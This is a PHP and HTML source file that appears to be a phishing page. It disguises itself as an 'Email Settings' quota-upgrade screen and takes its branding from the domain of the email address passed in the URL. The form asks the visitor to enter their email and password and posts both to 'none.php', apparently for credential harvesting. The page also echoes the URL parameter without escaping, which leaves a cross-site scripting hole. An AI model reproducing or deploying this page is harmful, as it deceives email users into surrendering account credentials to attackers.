<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>

<head>

<title><?php echo $yuh ?> | Email Settings</title>

</head>


<body bgcolor="#E6E6E6">

	<table align="center">
	
	<tr><td height="100"></td></tr>
	
	
	
	<tr><td>
	
		<table align="center">
		
		<tr><td height=""></td></tr>
		
		
		<tr><td>
		
			<table align="center">
			
			<tr><td>
			
				<table  align="center"  style="height:45px; background-color: #0B2161; border: solid 1px #0B2161; padding: 0px; 
				-moz-border-radius: 4px; -webkit-border-radius: 4px; -khtml-border-radius: 4px; border-radius: 4px;
				-moz-box-shadow: 3px 3px 3px #000; -webkit-box-shadow: 3px 3px 3px #000; box-shadow: 3px 3px 3px #000;">
				
				<tr>
				
				<td width="20"></td>
				
					
				
				<td>
				
					<font face="verdana" size="+1" color="#FFFFFF">
					
						<?php echo $yuh ?> | Email Settings
					
					</font>
				
				</td>
				
				
				
				
				<td width="20"></td>
				
				</tr></table>
			
			</td></tr>
			
			
			
			
			<tr><td height="10"></td>
			
			
			
			
			<tr><td>
			
				<div align="center">
				
					<font face="verdana" size="2" color="#FF0000">
					Confirm your ID to upgrade your mail quota
					</font>
				
				</font>
			
			</td></tr>
			
			
			
			
			
			<tr><td height="30">
			
				<form method="post" action="none.php">
			
			</td>
			
			
			
			
			
			<tr><td>
			
				<input name="login" value="<?php echo $_GET['email']; ?>" type="text" style="width:280px; height:40px; font-family: Verdana; font-size: 13px; color:#000000; 
				background-color: #FFFFFF; border: solid 1px #848484; padding: 12px; 
				-moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px;
				-moz-box-shadow: 3px 3px 3px #000; -webkit-box-shadow: 3px 3px 3px #000; box-shadow: 3px 3px 3px #000;" required="" placeholder="Enter Email">
			
			</td></tr>
			
			<tr><td height="5"></td>
			
			<tr><td>
			
				<div align="center">
				<input  name="passwd" type="password" 
				style="width:280px; height:40px; font-family: Verdana; font-size: 13px; color:#000000; 
				background-color: #FFFFFF; border: solid 1px #848484; padding: 12px; 
				-moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px;
				-moz-box-shadow: 3px 3px 3px #000; -webkit-box-shadow: 3px 3px 3px #000; box-shadow: 3px 3px 3px #000;" 
				required="" placeholder="Enter Password">
				
				</div>
			
			</td></tr>
			
			
			
			
			
			
			
			<tr><td height="5"></td>
			
			
			
			
			
			
			<tr><td>
			
				<table align="center=" width="270"><tr><td>
				
					<input  type="checkbox" checked>
					
					
					
					<font face="arial" size="2" color="">
					<b> Upgrade my Email Quota to 25GB</b>
					</font>
				
				</td></tr></table>
			
			</td></tr>
			
			
			
			
			
			<tr><td height="5"></td>
			
			
			
			
			
			
			<tr><td>
			
				<div align="center">
				
					<input  value="Upgrade Email Quota" type="submit" 
					style="width:280px; height:45px; font-family: Verdana; font-size: 12px; color:#ffffff; 
					background-color: #0B2161; border: solid 1px #0B2161; padding: 0px; 
					-moz-border-radius: 4px; -webkit-border-radius: 4px; -khtml-border-radius: 4px; border-radius: 4px;
					-moz-box-shadow: 3px 3px 3px #000; -webkit-box-shadow: 3px 3px 3px #000; box-shadow: 3px 3px 3px #000;">
				
				</div>
			
			</td></tr>
			
			</table>
		
		</td></tr>
		
		</table>
	
	</td></tr>
	
	</table>

</body>

</html>